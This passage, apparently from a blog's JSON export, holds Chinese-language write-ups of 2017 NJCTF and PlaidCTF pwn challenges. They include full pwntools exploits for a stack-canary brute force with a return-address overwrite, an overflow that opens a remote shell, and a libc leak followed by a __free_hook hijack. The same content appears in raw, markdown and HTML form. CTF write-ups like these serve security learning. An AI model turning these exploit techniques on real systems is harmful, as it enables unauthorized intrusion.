`pwntools`的`sendline`会在最后添加上`\\x0a`，而`send`会直接把数据发过去，我一度以为`\\x0a`是发送结尾的标配以至于不能爆破。。\n2. 关于linux的僵尸进程，`kill`是杀不掉的。。`kill -9 PID`可以杀掉，`killall name`可以杀掉包括进程簇，`pstree`或者`ps auxt`可以查看进程树。`defeunc`进程如果没有父进程的话。。**重启吧Orz**\n\n### exp\n\n```\nfrom pwn import *\nimport os, sys\n\nDEBUG = 0\n\nelf = ELF('./messager')\n\nif DEBUG:\n    context(log_level='debug')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\ndef do_canary():\n    canary = '\\x00'\n    off = 'a' * 104\n    while (len(canary)) != 8:\n        for i in range(256):\n            p = remote('127.0.0.1', 5555)\n            p.recvuntil('Welcome!\\n')\n            t = chr(i)\n            try:\n                print 'sending....', i\n                p.send(off + canary + t)\n                line = p.recvline()\n                if 'Message' in line:\n                    p.close()\n                    canary += t\n                    break\n            except Exception, e:\n                print e\n                p.close()\n                continue\n    return canary\n\nif __name__ == '__main__':\n    canary = do_canary()\n    p = remote('127.0.0.1', 5555)\n    p.recvuntil('Welcome!')\n    payload = 'a' * 104 + canary + p64(0) + p64(0x400BC6)\n    p.send(payload)\n    print p.recvall()\n    p.close()\n\n```\n\n## vsvs\n\n程序应该是调用的`system(\"echo input\")`，这样的函数，也就是说如果想办法让程序执行`system(\"/bin/sh)`那么就可以得到`shell`了。然而到现在我都还没搞懂这个程序的运行原理，存在`read`的栈溢出为什么就可以绕过过滤执行命令了呢。是覆盖了之前写的`input`里的值了么\n\n流程\n```\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017njctf/pwn/vsvs$ nc 218.2.197.235 23749 \nVSVS: Very Secure VPN Server\nPlease input access code:\n22\nCommand: echo <input>\ninput:\naaa\nWhat's your name?bbb\naaa\n```\n\n在`What's your name?`后存在栈溢出，猜测是超出缓冲区长度，覆盖了`input`中存在检查的值了\n\nexp:\n```\nfrom pwn import *\n\n'''\nfor i in range(10000000):\n    try:\n        p = remote('218.2.197.235', 23749)\n        p.recvuntil('code:\\n')\n        print 'sendling.... ', i\n        p.sendline(str(i))\n        a = p.recvline()\n        if 'Wrong' in a:\n            p.close()\n            continue\n        else:\n            print 'code is => ', i\n            break\n    except Exception, e:\n        continue\n'''\n\np = remote('218.2.197.235', 23749)\nexp = 'a' * 1024 + '/bin/sh'\np.sendlineafter('code:\\n', '22')\np.sendlineafter('input:\\n', '1')\np.sendlineafter('?', exp)\np.interactive()\n```","source":"_posts/2017NJCTF-PWN.md","raw":"---\ntitle: 2017NJCTF PWN\ntags:\n  - PWN\ncategories: []\ndate: 2017-03-14 22:04:51\n---\n\n## messager\n\n`fork`，出来的进程基本上和原进程完全一样，包括`canary`和`ebp`。爆破`canary`，得到值后跳转到`0x400BC6`。因为程序已经将`flag`加载到内存中了，这里的代码将内存中的`flag`发过来。\n\n**说几个因为太菜的坑吧。。**\n\n1. `pwntools`的`sendline`会在最后添加上`\\x0a`，而`send`会直接把数据发过去，我一度以为`\\x0a`是发送结尾的标配以至于不能爆破。。\n2. 关于linux的僵尸进程，`kill`是杀不掉的。。`kill -9 PID`可以杀掉，`killall name`可以杀掉包括进程簇，`pstree`或者`ps auxt`可以查看进程树。`defeunc`进程如果没有父进程的话。。**重启吧Orz**\n\n### exp\n\n```\nfrom pwn import *\nimport os, sys\n\nDEBUG = 0\n\nelf = ELF('./messager')\n\nif DEBUG:\n    context(log_level='debug')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\ndef do_canary():\n    canary = '\\x00'\n    off = 'a' * 104\n    while (len(canary)) != 8:\n        for i in range(256):\n            p = remote('127.0.0.1', 5555)\n            p.recvuntil('Welcome!\\n')\n            t = chr(i)\n            try:\n                print 'sending....', i\n                p.send(off + canary + t)\n                line = p.recvline()\n                if 'Message' in line:\n                    p.close()\n                    canary += t\n                    break\n            except Exception, e:\n                print e\n                p.close()\n                continue\n    return canary\n\nif __name__ == '__main__':\n    canary = do_canary()\n    p = remote('127.0.0.1', 5555)\n    p.recvuntil('Welcome!')\n    payload = 'a' * 104 + canary + p64(0) + p64(0x400BC6)\n    p.send(payload)\n    print p.recvall()\n    p.close()\n\n```\n\n## vsvs\n\n程序应该是调用的`system(\"echo input\")`，这样的函数，也就是说如果想办法让程序执行`system(\"/bin/sh)`那么就可以得到`shell`了。然而到现在我都还没搞懂这个程序的运行原理，存在`read`的栈溢出为什么就可以绕过过滤执行命令了呢。是覆盖了之前写的`input`里的值了么\n\n流程\n```\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2017njctf/pwn/vsvs$ nc 218.2.197.235 23749 \nVSVS: Very Secure VPN Server\nPlease input access code:\n22\nCommand: echo <input>\ninput:\naaa\nWhat's your name?bbb\naaa\n```\n\n在`What's your name?`后存在栈溢出，猜测是超出缓冲区长度，覆盖了`input`中存在检查的值了\n\nexp:\n```\nfrom pwn import *\n\n'''\nfor i in range(10000000):\n    try:\n        p = remote('218.2.197.235', 23749)\n        p.recvuntil('code:\\n')\n        print 'sendling.... ', i\n        p.sendline(str(i))\n        a = p.recvline()\n        if 'Wrong' in a:\n            p.close()\n            continue\n        else:\n            print 'code is => ', i\n            break\n    except Exception, e:\n        continue\n'''\n\np = remote('218.2.197.235', 23749)\nexp = 'a' * 1024 + '/bin/sh'\np.sendlineafter('code:\\n', '22')\np.sendlineafter('input:\\n', '1')\np.sendlineafter('?', exp)\np.interactive()\n```","slug":"2017NJCTF-PWN","published":1,"updated":"2017-03-16T05:22:18.177Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jxi000dhv1800ggtmps","content":"<h2 id=\"messager\"><a href=\"#messager\" class=\"headerlink\" title=\"messager\"></a>messager</h2><p><code>fork</code>，出来的进程基本上和原进程完全一样，包括<code>canary</code>和<code>ebp</code>。爆破<code>canary</code>，得到值后跳转到<code>0x400BC6</code>。因为程序已经将<code>flag</code>加载到内存中了，这里的代码将内存中的<code>flag</code>发过来。</p>\n<p><strong>说几个因为太菜的坑吧。。</strong></p>\n<ol>\n<li><code>pwntools</code>的<code>sendline</code>会在最后添加上<code>\\x0a</code>，而<code>send</code>会直接把数据发过去，我一度以为<code>\\x0a</code>是发送结尾的标配以至于不能爆破。。</li>\n<li>关于linux的僵尸进程，<code>kill</code>是杀不掉的。。<code>kill -9 PID</code>可以杀掉，<code>killall name</code>可以杀掉包括进程簇，<code>pstree</code>或者<code>ps auxt</code>可以查看进程树。<code>defeunc</code>进程如果没有父进程的话。。<strong>重启吧Orz</strong></li>\n</ol>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">import</span> os, sys</div><div class=\"line\"></div><div class=\"line\">DEBUG = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./messager'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> DEBUG:</div><div class=\"line\">    context(log_level=<span class=\"string\">'debug'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">do_canary</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    canary = <span class=\"string\">'\\x00'</span></div><div class=\"line\">    off = <span class=\"string\">'a'</span> * <span class=\"number\">104</span></div><div class=\"line\">    <span class=\"keyword\">while</span> (len(canary)) != <span class=\"number\">8</span>:</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</div><div class=\"line\">            p = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">5555</span>)</div><div class=\"line\">            p.recvuntil(<span class=\"string\">'Welcome!\\n'</span>)</div><div class=\"line\">            t = chr(i)</div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">'sending....'</span>, i</div><div class=\"line\">                p.send(off + canary + t)</div><div class=\"line\">                line = p.recvline()</div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'Message'</span> <span class=\"keyword\">in</span> line:</div><div class=\"line\">                    p.close()</div><div class=\"line\">                    canary += t</div><div class=\"line\">                    <span class=\"keyword\">break</span></div><div class=\"line\">            <span class=\"keyword\">except</span> Exception, e:</div><div class=\"line\">                <span class=\"keyword\">print</span> e</div><div class=\"line\">                p.close()</div><div class=\"line\">                <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">return</span> canary</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    canary = do_canary()</div><div class=\"line\">    p = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">5555</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Welcome!'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'a'</span> * <span class=\"number\">104</span> + canary + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x400BC6</span>)</div><div class=\"line\">    p.send(payload)</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvall()</div><div class=\"line\">    p.close()</div></pre></td></tr></table></figure>\n<h2 id=\"vsvs\"><a href=\"#vsvs\" class=\"headerlink\" title=\"vsvs\"></a>vsvs</h2><p>程序应该是调用的<code>system(&quot;echo input&quot;)</code>，这样的函数，也就是说如果想办法让程序执行<code>system(&quot;/bin/sh)</code>那么就可以得到<code>shell</code>了。然而到现在我都还没搞懂这个程序的运行原理，存在<code>read</code>的栈溢出为什么就可以绕过过滤执行命令了呢。是覆盖了之前写的<code>input</code>里的值了么</p>\n<p>流程<br><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">ubuntu@VM<span class=\"bullet\">-250</span><span class=\"bullet\">-199</span>-ubuntu:~/ctf-problem/<span class=\"number\">2017</span>njctf/pwn/vsvs$ nc <span class=\"number\">218.2</span><span class=\"number\">.197</span><span class=\"number\">.235</span> <span class=\"number\">23749</span> </div><div class=\"line\"><span class=\"attr\">VSVS:</span> Very Secure VPN Server</div><div class=\"line\">Please input access code:</div><div class=\"line\"><span class=\"number\">22</span></div><div class=\"line\"><span class=\"attr\">Command:</span> echo &lt;input<span class=\"string\">&gt;</span></div><div class=\"line\"><span class=\"attr\">input:</span></div><div class=\"line\">aaa</div><div class=\"line\">What<span class=\"string\">'s your name?bbb</span></div><div class=\"line\">aaa</div></pre></td></tr></table></figure></p>\n<p>在<code>What&#39;s your name?</code>后存在栈溢出，猜测是超出缓冲区长度，覆盖了<code>input</code>中存在检查的值了</p>\n<p>exp:<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"keyword\">range</span>(<span class=\"number\">10000000</span>):</div><div class=\"line\">    try:</div><div class=\"line\">        p = remote(<span class=\"string\">'218.2.197.235'</span>, <span class=\"number\">23749</span>)</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'code:\\n'</span>)</div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">'sendling.... '</span>, i</div><div class=\"line\">        p.sendline(str(i))</div><div class=\"line\">        a = p.recvline()</div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Wrong'</span> in a:</div><div class=\"line\">            p.<span class=\"built_in\">close</span>()</div><div class=\"line\">            <span class=\"keyword\">continue</span></div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">'code is =&gt; '</span>, i</div><div class=\"line\">            <span class=\"keyword\">break</span></div><div class=\"line\">    except Exception, e:</div><div class=\"line\">        <span class=\"keyword\">continue</span></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\"></div><div class=\"line\">p = remote(<span class=\"string\">'218.2.197.235'</span>, <span class=\"number\">23749</span>)</div><div class=\"line\">exp = <span class=\"string\">'a'</span> * <span class=\"number\">1024</span> + <span class=\"string\">'/bin/sh'</span></div><div class=\"line\">p.sendlineafter(<span class=\"string\">'code:\\n'</span>, <span class=\"string\">'22'</span>)</div><div class=\"line\">p.sendlineafter(<span class=\"string\">'input:\\n'</span>, <span class=\"string\">'1'</span>)</div><div class=\"line\">p.sendlineafter(<span class=\"string\">'?'</span>, exp)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<h2 id=\"messager\"><a href=\"#messager\" class=\"headerlink\" title=\"messager\"></a>messager</h2><p><code>fork</code>，出来的进程基本上和原进程完全一样，包括<code>canary</code>和<code>ebp</code>。爆破<code>canary</code>，得到值后跳转到<code>0x400BC6</code>。因为程序已经将<code>flag</code>加载到内存中了，这里的代码将内存中的<code>flag</code>发过来。</p>\n<p><strong>说几个因为太菜的坑吧。。</strong></p>\n<ol>\n<li><code>pwntools</code>的<code>sendline</code>会在最后添加上<code>\\x0a</code>，而<code>send</code>会直接把数据发过去，我一度以为<code>\\x0a</code>是发送结尾的标配以至于不能爆破。。</li>\n<li>关于linux的僵尸进程，<code>kill</code>是杀不掉的。。<code>kill -9 PID</code>可以杀掉，<code>killall name</code>可以杀掉包括进程簇，<code>pstree</code>或者<code>ps auxt</code>可以查看进程树。<code>defeunc</code>进程如果没有父进程的话。。<strong>重启吧Orz</strong></li>\n</ol>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">import</span> os, sys</div><div class=\"line\"></div><div class=\"line\">DEBUG = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./messager'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> DEBUG:</div><div class=\"line\">    context(log_level=<span class=\"string\">'debug'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">do_canary</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    canary = <span class=\"string\">'\\x00'</span></div><div class=\"line\">    off = <span class=\"string\">'a'</span> * <span class=\"number\">104</span></div><div class=\"line\">    <span class=\"keyword\">while</span> (len(canary)) != <span class=\"number\">8</span>:</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</div><div class=\"line\">            p = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">5555</span>)</div><div class=\"line\">            p.recvuntil(<span class=\"string\">'Welcome!\\n'</span>)</div><div class=\"line\">            t = chr(i)</div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">'sending....'</span>, i</div><div class=\"line\">                p.send(off + canary + t)</div><div class=\"line\">                line = p.recvline()</div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'Message'</span> <span class=\"keyword\">in</span> line:</div><div class=\"line\">                    p.close()</div><div class=\"line\">                    canary += t</div><div class=\"line\">                    <span class=\"keyword\">break</span></div><div class=\"line\">            <span class=\"keyword\">except</span> Exception, e:</div><div class=\"line\">                <span class=\"keyword\">print</span> e</div><div class=\"line\">                p.close()</div><div class=\"line\">                <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">return</span> canary</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    canary = do_canary()</div><div class=\"line\">    p = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">5555</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Welcome!'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'a'</span> * <span class=\"number\">104</span> + canary + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x400BC6</span>)</div><div class=\"line\">    p.send(payload)</div><div class=\"line\">    <span class=\"keyword\">print</span> p.recvall()</div><div class=\"line\">    p.close()</div></pre></td></tr></table></figure>\n<h2 id=\"vsvs\"><a href=\"#vsvs\" class=\"headerlink\" title=\"vsvs\"></a>vsvs</h2><p>程序应该是调用的<code>system(&quot;echo input&quot;)</code>，这样的函数，也就是说如果想办法让程序执行<code>system(&quot;/bin/sh)</code>那么就可以得到<code>shell</code>了。然而到现在我都还没搞懂这个程序的运行原理，存在<code>read</code>的栈溢出为什么就可以绕过过滤执行命令了呢。是覆盖了之前写的<code>input</code>里的值了么</p>\n<p>流程<br><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">ubuntu@VM<span class=\"bullet\">-250</span><span class=\"bullet\">-199</span>-ubuntu:~/ctf-problem/<span class=\"number\">2017</span>njctf/pwn/vsvs$ nc <span class=\"number\">218.2</span><span class=\"number\">.197</span><span class=\"number\">.235</span> <span class=\"number\">23749</span> </div><div class=\"line\"><span class=\"attr\">VSVS:</span> Very Secure VPN Server</div><div class=\"line\">Please input access code:</div><div class=\"line\"><span class=\"number\">22</span></div><div class=\"line\"><span class=\"attr\">Command:</span> echo &lt;input<span class=\"string\">&gt;</span></div><div class=\"line\"><span class=\"attr\">input:</span></div><div class=\"line\">aaa</div><div class=\"line\">What<span class=\"string\">'s your name?bbb</span></div><div class=\"line\">aaa</div></pre></td></tr></table></figure></p>\n<p>在<code>What&#39;s your name?</code>后存在栈溢出，猜测是超出缓冲区长度，覆盖了<code>input</code>中存在检查的值了</p>\n<p>exp:<br><figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"keyword\">range</span>(<span class=\"number\">10000000</span>):</div><div class=\"line\">    try:</div><div class=\"line\">        p = remote(<span class=\"string\">'218.2.197.235'</span>, <span class=\"number\">23749</span>)</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'code:\\n'</span>)</div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">'sendling.... '</span>, i</div><div class=\"line\">        p.sendline(str(i))</div><div class=\"line\">        a = p.recvline()</div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Wrong'</span> in a:</div><div class=\"line\">            p.<span class=\"built_in\">close</span>()</div><div class=\"line\">            <span class=\"keyword\">continue</span></div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">'code is =&gt; '</span>, i</div><div class=\"line\">            <span class=\"keyword\">break</span></div><div class=\"line\">    except Exception, e:</div><div class=\"line\">        <span class=\"keyword\">continue</span></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\"></div><div class=\"line\">p = remote(<span class=\"string\">'218.2.197.235'</span>, <span class=\"number\">23749</span>)</div><div class=\"line\">exp = <span class=\"string\">'a'</span> * <span class=\"number\">1024</span> + <span class=\"string\">'/bin/sh'</span></div><div class=\"line\">p.sendlineafter(<span class=\"string\">'code:\\n'</span>, <span class=\"string\">'22'</span>)</div><div class=\"line\">p.sendlineafter(<span class=\"string\">'input:\\n'</span>, <span class=\"string\">'1'</span>)</div><div class=\"line\">p.sendlineafter(<span class=\"string\">'?'</span>, exp)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure></p>\n"},{"title":"2017PlaidCTF bigpicture","date":"2017-04-26T10:43:50.000Z","_content":"\n## bigpicture\n\n我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。\n\n给了c文件，良心。。可能觉得其他的pwnable都太变态了吧。。这周还有Defcon的一个外卡赛，继续观摩大佬们秒题。\n\n明显存在一个数组边界溢出，没有检查负数情况。同时分配的内存大小可控，我们可以分配得到一个mmap映射的内存，这样就相当于绕过了aslr。。\n\n推荐一个工具**[one_gadget](https://github.com/david942j/one_gadget)**，正如作者所说\n> This gem provides such gadgets finder, no need to use IDA-pro every time like a fool.\n\n嗯，真的每次找one_gadget都想SB一样，最主要的是这个工具直接给出了参数条件，良心。。。\n\n用到了一个`calloc`函数，第一次是在0CTF中遇到，和`malloc`功能相同，但是会把分配得到的内存清`0`。\n学到一个快速查看函数的方法，如：`man calloc`\n```\nMALLOC(3)                                                                                 Linux Programmer's Manual                                                                                 MALLOC(3)\n\nNAME\n       malloc, free, calloc, realloc - allocate and free dynamic memory\n\nSYNOPSIS\n       #include <stdlib.h>\n\n       void *malloc(size_t size);\n       void free(void *ptr);\n       void *calloc(size_t nmemb, size_t size);\n       void *realloc(void *ptr, size_t size);\n\nDESCRIPTION\n       The  malloc() function allocates size bytes and returns a pointer to the allocated memory.  The memory is not initialized.  If size is 0, then malloc() returns either NULL, or a unique pointer value\n       that can later be successfully passed to free().\n\n       The free() function frees the memory space pointed to by ptr, which must have been returned by a previous call to malloc(), calloc(), or realloc().  Otherwise,  or  if  free(ptr)  has  already  been\n       called before, undefined behavior occurs.  If ptr is NULL, no operation is performed.\n\n       The  calloc() function allocates memory for an array of nmemb elements of size bytes each and returns a pointer to the allocated memory.  The memory is set to zero.  If nmemb or size is 0, then cal‐\n       loc() returns either NULL, or a unique pointer value that can later be successfully passed to free().\n\n       The realloc() function changes the size of the memory block pointed to by ptr to size bytes.  The contents will be unchanged in the range from the start of the region up to the minimum  of  the  old\n       and  new  sizes.  If the new size is larger than the old size, the added memory will not be initialized.  If ptr is NULL, then the call is equivalent to malloc(size), for all values of size; if size\n       is equal to zero, and ptr is not NULL, then the call is equivalent to free(ptr).  Unless ptr is NULL, it must have been returned by an earlier call to malloc(), calloc() or realloc().  If  the  area\n       pointed to was moved, a free(ptr) is done.\n\nRETURN VALUE\n       The malloc() and calloc() functions return a pointer to the allocated memory, which is suitably aligned for any built-in type.  On error, these functions return NULL.  NULL may also be returned by a\n       successful call to malloc() with a size of zero, or by a successful call to calloc() with nmemb or size equal to zero.\n\n       The free() function returns no value.\n\n       The realloc() function returns a pointer to the newly allocated memory, which is suitably aligned for any built-in type and may be different from ptr, or NULL if the  request  fails.   If  size  was\n       equal to 0, either NULL or a pointer suitable to be passed to free() is returned.  If realloc() fails, the original block is left untouched; it is not freed or moved.\n\nERRORS\n       calloc(), malloc(), and realloc() can fail with the following error:\n\n       ENOMEM Out of memory.  Possibly, the application hit the RLIMIT_AS or RLIMIT_DATA limit described in getrlimit(2).\n\nATTRIBUTES\n       For an explanation of the terms used in this section, see attributes(7).\n\n       ┌─────────────────────┬───────────────┬─────────┐\n       │Interface            │ Attribute     │ Value   │\n       ├─────────────────────┼───────────────┼─────────┤\n       │malloc(), free(),    │ Thread safety │ MT-Safe │\n       │calloc(), realloc()  │               │         │\n       └─────────────────────┴───────────────┴─────────┘\n...\n...\n...\n```\n\n思路：\n1. 利用任意地址读泄露libc基址\n2. 将`__free_hook`修改为`one_gadget`\n\nexp：\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./bigpicture')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\noffset = 0x109000 + 16\n\ndef edit(address, data):\n    t = 0\n    address -= 0x398000\n    for i in range(offset - (address - libc.address), offset - (address - libc.address) - 8, -1):\n        k = -i\n        p.recvuntil('>')\n        p.sendline('0, {}, {}'.format(k, data[t]))\n        t += 1\n\ndef pwn():\n    p.recvuntil('big?')\n    p.sendline('1000 x 1000')\n    leak_realloc = ''       # _dl_runtime_resolve_avx_slow\n#    gdb.attach(p)\n    for i in range(0x109000 - 24, 0x109000 - 30, -1):\n        k = -i\n        p.recvuntil('>')\n        p.sendline('0, {}, r'.format(k))\n        p.recvuntil('overwriting ')\n        leak_realloc = p.recv(1) + leak_realloc\n    print leak_realloc.encode('hex')\n    leak_realloc = int(leak_realloc.encode('hex'), 16)\n    libc.address = leak_realloc - libc.plt['realloc'] - 6 - 0x10\n    print 'libc.address => ', hex(libc.address)\n    __free_hook_addr = libc.symbols['__free_hook']\n    print '__free_hook => ', hex(libc.symbols['__free_hook'])\n    one_gadget = libc.address + 0x3f33a\n    print 'one_gadget => ', hex(one_gadget)\n    edit(__free_hook_addr, p64(one_gadget))\n#    gdb.attach(p)\n    p.sendline('quit')\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```","source":"_posts/2017PlaidCTF-bigpicture.md","raw":"---\ntitle: 2017PlaidCTF bigpicture\ntags:\n  - PWN\ncategories: []\ndate: 2017-04-26 18:43:50\n---\n\n## bigpicture\n\n我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。\n\n给了c文件，良心。。可能觉得其他的pwnable都太变态了吧。。这周还有Defcon的一个外卡赛，继续观摩大佬们秒题。\n\n明显存在一个数组边界溢出，没有检查负数情况。同时分配的内存大小可控，我们可以分配得到一个mmap映射的内存，这样就相当于绕过了aslr。。\n\n推荐一个工具**[one_gadget](https://github.com/david942j/one_gadget)**，正如作者所说\n> This gem provides such gadgets finder, no need to use IDA-pro every time like a 